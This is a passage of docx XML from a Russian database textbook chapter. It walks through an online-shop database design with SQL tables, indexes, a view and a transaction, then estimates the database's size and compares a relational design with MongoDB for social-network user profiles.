        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2.6. Связь с жизненным циклом БД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Вспомним </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>главу 4.1 (Жизненный цикл БД)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Архитектура БД — это часть фазы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>проектирования</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Анализ требований** → "Нам нужна БД для университета"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Проектирование:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Концептуальное** (инфологическое) → ER-диаграммы (глава 7.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Логическое** (даталогическое) → **Концептуальный уровень архитектуры** (таблицы, связи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Физическое** → **Внутренний уровень архитектуры** (индексы, файлы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Реализация** → Создание БД в СУБД (MySQL, PostgreSQL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Заполнение данными** → INSERT'ы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Эксплуатация** → Пользователи работают через **внешний уровень** (Views)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Три уровня архитектуры = три этапа проектирования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2.7. Пример 8: Разработка БД для интернет-магазина (полный цикл)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Разберём на примере, как всё связано.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Этап 1: Анализ требований</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Создать БД для интернет-магазина.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Требования:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хранить товары (название, цена, количество на складе)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Регистрация пользователей (email, пароль, адрес)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оформление заказов (корзина → заказ → оплата)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>История заказов пользователя</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Этап 2: Концептуальное проектирование (инфологическое)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ER-диаграмма:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[Пользователь] --&lt; делает &gt;-- [Заказ] --&lt; содержит &gt;-- [Товар]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сущности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь (User): id, email, password, address</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заказ (Order): id, user_id, date, status</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Товар (Product): id, name, price, stock</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ОрдерТовар (OrderProduct): order_id, product_id, quantity, price</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связи:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь → Заказ (1:N) — один пользователь может сделать много заказов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заказ → Товар (M:N) — заказ содержит много товаров, товар может быть в разных заказах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Этап 3: Логическое проектирование (концептуальный уровень архитектуры)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблицы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE TABLE users (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    id INT PRIMARY KEY AUTO_INCREMENT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    email VARCHAR(100) UNIQUE NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    password_hash VARCHAR(255) NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    address TEXT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>CREATE TABLE products (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    id INT PRIMARY KEY AUTO_INCREMENT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(100) NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    price DECIMAL(10, 2) NOT NULL CHECK (price &gt; 0),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    stock INT NOT NULL CHECK (stock &gt;= 0)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>CREATE TABLE orders (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    id INT PRIMARY KEY AUTO_INCREMENT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user_id INT NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    status ENUM('pending', 'paid', 'shipped', 'delivered') DEFAULT 'pending',</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>CREATE TABLE order_products (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    product_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    quantity INT NOT NULL CHECK (quantity &gt; 0),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    price DECIMAL(10, 2) NOT NULL,  -- цена на момент покупки (может измениться в будущем)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PRIMARY KEY (order_id, product_id),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (order_id) REFERENCES orders(id) ON DELETE CASCADE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (product_id) REFERENCES products(id)</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Этап 4: Физическое проектирование (внутренний уровень архитектуры)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Индексы для ускорения:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Ускорить поиск пользователя по email</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_users_email ON users(email);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Ускорить выборку заказов пользователя</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_orders_user_id ON orders(user_id);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Ускорить поиск товаров в заказе</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_order_products_order_id ON order_products(order_id);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Оптимизация:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Использовать InnoDB для поддержки транзакций</w:t>
        <w:br/>
        <w:t>ALTER TABLE orders ENGINE = InnoDB;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Этап 5: Внешний уровень (представления для пользователей)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Представление: История заказов пользователя</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE VIEW my_orders AS</w:t>
        <w:br/>
        <w:t xml:space="preserve">SELECT orders.id, orders.date, orders.status, </w:t>
        <w:br/>
        <w:t xml:space="preserve">       SUM(order_products.quantity * order_products.price) AS total</w:t>
        <w:br/>
        <w:t>FROM orders</w:t>
        <w:br/>
        <w:t>JOIN order_products ON orders.id = order_products.order_id</w:t>
        <w:br/>
        <w:t>WHERE orders.user_id = CURRENT_USER_ID()</w:t>
        <w:br/>
        <w:t>GROUP BY orders.id;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пользователь делает запрос:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>SELECT * FROM my_orders;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| id | date | status | total |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----|------|--------|-------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 2025-01-10 14:30:00 | delivered | 1500.00 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2 | 2025-01-12 09:15:00 | shipped | 2300.00 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Этап 6: Заполнение данными</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Добавить пользователя</w:t>
        <w:br/>
        <w:t xml:space="preserve">INSERT INTO users (email, password_hash, address) </w:t>
        <w:br/>
        <w:t>VALUES ('ivan@mail.ru', 'hashed_password_123', 'Москва, ул. Ленина, 10');</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Добавить товары</w:t>
        <w:br/>
        <w:t>INSERT INTO products (name, price, stock) VALUES</w:t>
        <w:br/>
        <w:t>('Носки', 150.00, 100),</w:t>
        <w:br/>
        <w:t>('Трусы', 200.00, 50),</w:t>
        <w:br/>
        <w:t>('Майка', 300.00, 75);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Создать заказ</w:t>
        <w:br/>
        <w:t>START TRANSACTION;</w:t>
        <w:br/>
        <w:br/>
        <w:t>INSERT INTO orders (user_id, status) VALUES (1, 'pending');</w:t>
        <w:br/>
        <w:t>SET @order_id = LAST_INSERT_ID();</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Добавить товары в заказ</w:t>
        <w:br/>
        <w:t>INSERT INTO order_products (order_id, product_id, quantity, price) VALUES</w:t>
        <w:br/>
        <w:t>(@order_id, 1, 2, 150.00),  -- 2 пары носков</w:t>
        <w:br/>
        <w:t>(@order_id, 3, 1, 300.00);  -- 1 майка</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Уменьшить количество товаров на складе</w:t>
        <w:br/>
        <w:t>UPDATE products SET stock = stock - 2 WHERE id = 1;</w:t>
        <w:br/>
        <w:t>UPDATE products SET stock = stock - 1 WHERE id = 3;</w:t>
        <w:br/>
        <w:br/>
        <w:t>COMMIT;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Заказ на 600 рублей (2×150 + 1×300).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2.8. Пример 9: Расчёт размера БД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Оценить размер БД для интернет-магазина на 1 млн пользователей, 10 тыс. товаров, 5 млн заказов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `users`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`id` (INT, 4 байта) + `email` (VARCHAR(100), ~30 байт) + `password_hash` (VARCHAR(255), ~60 байт) + `address` (TEXT, ~100 байт) + `created_at` (TIMESTAMP, 4 байта) ≈ **200 байт/запись**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1 млн пользователей × 200 байт = **200 МБ**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `products`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`id` (INT, 4) + `name` (VARCHAR(100), ~50) + `price` (DECIMAL(10,2), 5) + `stock` (INT, 4) ≈ **65 байт/запись**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>10 тыс. товаров × 65 байт = **650 КБ**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `orders`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`id` (INT, 4) + `user_id` (INT, 4) + `date` (TIMESTAMP, 4) + `status` (ENUM, 1) ≈ **15 байт/запись**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>5 млн заказов × 15 байт = **75 МБ**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `order_products`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`order_id` (INT, 4) + `product_id` (INT, 4) + `quantity` (INT, 4) + `price` (DECIMAL(10,2), 5) ≈ **17 байт/запись**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Допустим, в среднем 3 товара на заказ → 5 млн × 3 = 15 млн записей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>15 млн × 17 байт = **255 МБ**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Индексы (примерно 20-30% от данных):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ~150 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итого:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 200 + 0.65 + 75 + 255 + 150 ≈ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>680 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> БД помещается на любой современный диск (SSD на 1 ТБ стоит ~$100). Но если пользователей 100 млн — будет уже </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>68 ГБ</w:t>
      </w:r>
      <w:r>
        <w:t>, и тут нужны более мощные серверы, репликация, шардирование.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2.9. Пример 10: Сравнение реляционной БД и NoSQL</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Хранить профили пользователей социальной сети.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Вариант 1: Реляционная БД (MySQL)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `users`:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| id | name | email | city | age |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----|------|-------|------|-----|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | Иван | ivan@mail.ru | Москва | 25 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2 | Пётр | petr@mail.ru | СПб | 30 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `friends` (связь M:N):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| user_id | friend_id |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---------|-----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 2 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2 | 1 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Запрос:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти всех друзей Ивана.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>SELECT users.name</w:t>
        <w:br/>
        <w:t>FROM friends</w:t>
        <w:br/>
        <w:t>JOIN users ON friends.friend_id = users.id</w:t>
        <w:br/>
        <w:t>WHERE friends.user_id = 1;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>JOIN медленный (особенно если друзей 1000)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложно добавить новые поля (например, хобби, список фото) — надо менять схему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Вариант 2: Документоориентированная БД (MongoDB)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Документ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "_id": 1,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "name": "Иван",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "email": "ivan@mail.ru",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "city": "Москва",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "age": 25,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "friends": [2, 5, 10],  // ID друзей</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "hobbies": ["футбол", "программирование"],</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "photos": [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {"url": "photo1.jpg", "date": "2025-01-01"},</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {"url": "photo2.jpg", "date": "2025-01-05"}</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ]</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Запрос:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти всех друзей Ивана.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>db.users.find({ _id: { $in: db.users.findOne({ _id: 1 }).friends } })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет JOIN'ов (данные в одном документе)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Гибкая схема (можно добавить поле `hobbies` без изменения структуры)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Денормализация (если изменилось имя друга, надо обновить во всех документах)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет гарантий целостности (можно записать `friends: [999]`, даже если пользователя 999 не существует)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Для социальной сети с гибкой схемой и сложными связями (друзья друзей) лучше подходит </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>графовая БД (Neo4j)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>документоориентированная (MongoDB)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**База данных (БД)** — структурированная совокупность данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**СУБД (DBMS)** — программа для управления БД (MySQL, PostgreSQL, Oracle)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DDL** — определение данных (CREATE, ALTER, DROP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
